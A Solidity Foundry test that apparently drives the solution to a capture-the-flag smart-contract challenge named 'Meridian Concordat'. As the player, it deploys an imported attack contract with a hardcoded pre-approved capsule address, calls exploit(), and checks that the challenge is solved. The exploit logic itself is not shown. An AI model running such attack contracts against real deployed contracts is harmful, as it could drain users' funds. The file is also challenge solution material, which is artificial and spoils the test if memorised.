// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {IChallenge, IMeridianCredits} from "../src/IMeridianConcordat.sol";
import {MeridianConcordatAttack} from "../src/MeridianConcordatAttack.sol";

contract MeridianConcordatTest is Test {
    function test_exploit() public {
        address attacker = vm.envAddress("PLAYER_ADDRESS");
        address challengeAddr = vm.envAddress("CHALLENGE_ADDRESS");

        IChallenge challenge = IChallenge(challengeAddr);
        address mrc = challenge.MRC();
        address boreas = challenge.BOREAS();
        address helix = challenge.HELIX();
        address axiom = challenge.AXIOM();

        // The pre-approved capsule for HELIX
        address capsule = 0x47A849889029A91b005779C95D237b0b0d667791;

        vm.startPrank(attacker);

        // Deploy and run the attack
        MeridianConcordatAttack attack = new MeridianConcordatAttack(
            boreas, helix, axiom, mrc, capsule, attacker
        );
        attack.exploit();

        vm.stopPrank();

        // Verify
        uint256 balance = IMeridianCredits(mrc).balanceOf(attacker);
        emit log_named_uint("Player MRC balance", balance);
        assertTrue(challenge.isSolved(), "Challenge not solved!");
    }
}
